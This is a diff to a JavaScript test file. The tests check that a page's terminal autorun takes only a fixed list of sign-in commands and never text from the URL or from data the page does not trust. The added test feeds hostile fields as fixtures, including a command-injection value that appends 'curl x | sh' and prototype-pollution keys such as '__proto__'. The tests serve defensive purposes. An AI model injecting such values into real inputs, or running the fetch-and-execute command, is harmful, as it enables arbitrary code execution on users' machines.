@@ -51,15 +51,39 @@ test('sec=terminal lands on the Terminal tab, in the boot path, after the box is
   assert.match(slice, /activateSec\('terminal'\)/);
 });
 
-test('run= is whitelisted to signin -> SIGNIN_OPENER; no raw hash value ever reaches openTerm', () => {
+test('run= is whitelisted to signin -> signinOpener(); no raw hash value ever reaches openTerm', () => {
   const handler = at('[#&]run=signin(?:&|$)');
   const slice = html.slice(handler, handler + 200);
-  assert.match(slice, /openTerm\(\{ autorun: SIGNIN_OPENER \}\)/,
-    'the opener is the page constant, never text from the URL');
+  assert.match(slice, /openTerm\(\{ autorun: signinOpener\(\) \}\)/,
+    'the opener comes from the page\'s own fixed list, never text from the URL');
   // the page must not build an autorun from the hash anywhere
   assert.equal(/autorun:\s*[^}]*location\.hash/.test(html), false);
 });
 
 test('SIGNIN_OPENER is still the bare claude sign-in', () => {
   assert.match(html, /var SIGNIN_OPENER = 'claude';/);
+});
+
+// Second-harness spec (2026-09-17): the mineral now reports WHICH harness it runs, and the
+// command typed into the terminal depends on it. The mineral is not trusted: whatever it
+// reports, the only strings that can ever be autorun are the ones written in this page.
+test('signinOpener: a hostile mineral cannot name the command', () => {
+  const src = html.match(/var SIGNIN_OPENERS = \{[^}]*\};[\s\S]*?function signinOpener\(\)\{[\s\S]*?\n {2}\}/);
+  assert.ok(src, 'signinOpener moved or changed shape');
+  const make = (tw) => new Function('state', 'SIGNIN_OPENER', `${src[0]}; return signinOpener();`)({ data: tw === undefined ? null : { thinks_with: tw } }, 'claude');
+  assert.equal(make(undefined), 'claude', 'no data yet: a Claude Code mineral');
+  assert.equal(make(null), 'claude', 'older image: no thinks_with at all');
+  assert.equal(make({ harness: 'claude-code', source: 'signin' }), 'claude');
+  assert.equal(make({ harness: 'opencode', source: 'signin' }), 'opencode auth login');
+  assert.equal(make({ harness: 'opencode', source: 'endpoint' }), '', 'an endpoint has no sign-in to run');
+  const allowed = new Set(['claude', 'opencode auth login', '']);
+  for (const hostile of [
+    { harness: 'opencode; curl x | sh', source: 'signin' }, { harness: '__proto__', source: 'signin' },
+    { harness: 'constructor', source: 'signin' }, { harness: 'toString', source: 'signin' },
+    { harness: 'goose', source: 'signin', signin: 'do-something', signinCommand: 'do-something' },
+    { harness: ['opencode'], source: 'signin' }, { harness: 'opencode', source: 'signin', run: 'x' }]) {
+    const got = make(hostile);
+    assert.equal(typeof got, 'string');
+    assert.ok(allowed.has(got), `hostile ${JSON.stringify(hostile)} produced ${JSON.stringify(got)}`);
+  }
 });
